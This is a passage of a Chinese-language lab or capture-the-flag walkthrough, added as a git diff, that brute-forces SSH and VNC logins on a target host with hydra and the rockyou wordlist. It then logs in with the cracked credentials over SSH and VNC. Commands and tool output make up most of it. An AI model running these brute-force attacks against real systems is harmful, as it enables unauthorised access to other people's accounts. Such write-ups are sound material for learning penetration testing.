@@ -363,3 +363,77 @@ Date:   Sun Apr 19 00:08:12 2026 -0400
 这个命令可以直接查看删除的文件
 ## 密码爆破
 既然密码不对，那就没什么别的想法了，只能去爆破一下密码。
+爆破ssh：
+```bash
+┌──(kali㉿kali)-[~]
+└─$ hydra  -l mingmingjiu -P /usr/share/wordlists/rockyou.txt ssh://10.241.108.244  -t 4 -e nsr
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-29 15:33:49
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344402 login tries (l:1/p:14344402), ~3586101 tries per task
+[DATA] attacking ssh://10.241.108.244:22/
+[22][ssh] host: 10.241.108.244   login: mingmingjiu   password: mingmingjiu
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-29 15:34:06
+```
+这里爆破vnc也是可以的，但是因为没有用户名所以不能用`-e nsr`去尝试用户名作为密码，如果自己添加一个密码字典那也是可以的。下面是直接爆破vnc：
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cat pass.txt
+mingmingjiu
+
+┌──(kali㉿kali)-[~]
+└─$ hydra  -P ./pass.txt vnc://10.241.108.244 -s 5901 -t 4 -e nsr
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-29 15:35:10
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
+[DATA] attacking vnc://10.241.108.244:5901/
+[5901][vnc] host: 10.241.108.244   password: mingmingjiu
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-29 15:35:11
+```
+先尝试了ssh连接：
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ssh mingmingjiu@10.241.108.244
+mingmingjiu@10.241.108.244's password:
+Linux MM 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Apr 27 10:24:11 2026 from 10.241.108.201
+This account is currently not available.
+Connection to 10.241.108.244 closed.
+```
+但是连上马上就断开了，原因是这个用户没有shell权限。
+那我们试一下vnc连接
+```bash
+┌──(kali㉿kali)-[~]
+└─$ vncviewer 10.241.108.244:5901
+Connected to RFB server, using protocol version 3.8
+Enabling TightVNC protocol extensions
+Performing standard VNC authentication
+Password: 
+Authentication successful
+Desktop name "mingmingjiu's X desktop (MM:1)"
+VNC server default format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Using default colormap which is TrueColor.  Pixel format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+
+
+```
+连上了。但是打开终端救闪退。这里在Application中找一个其他终端可以打开`Xtrem`
+![](file-20260429154141136.png)
